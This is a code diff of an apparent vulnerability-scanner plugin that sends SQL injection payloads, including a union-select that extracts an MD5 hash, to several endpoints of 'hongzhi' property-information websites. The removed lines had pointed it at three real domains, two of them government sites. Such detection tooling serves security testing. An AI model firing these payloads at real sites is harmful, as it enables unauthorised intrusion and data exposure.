@@ -15,9 +15,9 @@ import re
 def assign(service, arg):
     if service == "hongzhi":
         return True, arg
-        
-        
-def audit(arg): 
+
+
+def audit(arg):
     payloads = [
         'PubInfo/lpxx.asp?qyxmbm=1',
         'web/PubInfo/lpxx.asp?qyxmbm=1',
@@ -37,21 +37,23 @@ def audit(arg):
         m2 = re.findall('td',res2)
         if m1 != m2:
             security_hole(arg + payload + '   :found sql Injection')
+            return arg
 
-            
-            
+
+
     payloads = [
         'pubinfo/xmdljgxx_Detail.asp?jgbh=',
-        'web/pubinfo/xmdljgxx_Detail.asp?jgbh=',    
+        'web/pubinfo/xmdljgxx_Detail.asp?jgbh=',
         ]
     getdata = '%27%20union%20all%20select%201,2,3,4,5,6,7,8,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)),10,11,12,13,14--'
     for payload in payloads:
-        url = arg + payload + getdata 
+        url = arg + payload + getdata
         code, head, res, errcode, _ = curl.curl2(url)
         if code ==200 and '0x81dc9bdb52d04dc20036dbd8313ed055' in res:
             security_hole(arg + payload + '   :found sql Injection')
-            
-    
+            return arg
+
+
     payloads = [
         'Article.asp?wzxh=1',
         'web/Article.asp?wzxh=1',
@@ -65,9 +67,9 @@ def audit(arg):
         code2, head, res2, errcode, _ = curl.curl2(url2)
         if code1 == 200 and code2 == 200 and 'href' in res1 and 'href' not in res2:
             security_hole(arg + payload + '   :found sql Injection')
-        
-        
-        
+            return arg
+
+
     payloads = [
         'PubInfo/Ranklist.asp?rank=',
         'web/PubInfo/Ranklist.asp?rank='
@@ -78,9 +80,9 @@ def audit(arg):
         code, head, res, errcode, _ = curl.curl2(url)
         if code ==200 and '0x81dc9bdb52d04dc20036dbd8313ed055' in res:
             security_hole(arg + payload + '   :found sql Injection')
-    
-    
-    
+            return arg
+
+
     payloads = [
         'Web_Site/NewsMore.aspx?lmid=1',
         'web/Web_Site/NewsMore.aspx?lmid=1'
@@ -91,9 +93,9 @@ def audit(arg):
         code, head, res, errcode, _ = curl.curl2(url)
         if code ==500 and 'master' in res:
             security_hole(arg + payload + '   :found sql Injection')
-     
+            return arg
 
-     
+
     payloads = [
         'Web_Site/Search.aspx?type=0&keyword=',
         'web/Web_Site/Search.aspx?type=0&keyword='
@@ -103,10 +105,9 @@ def audit(arg):
         url = arg + payload + getdata
         code, head, res, errcode, _ = curl.curl2(url)
         if code ==500 and 'master' in res:
-            security_hole(arg + payload + '   :found sql Injection')   
+            security_hole(arg + payload + '   :found sql Injection')
 
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('hongzhi', 'http://www.essfdc.gov.cn/')[1])
-    audit(assign('hongzhi', 'http://www.haxfdc.com/')[1])
-    audit(assign('hongzhi', 'http://www.tmfdc.gov.cn/')[1])
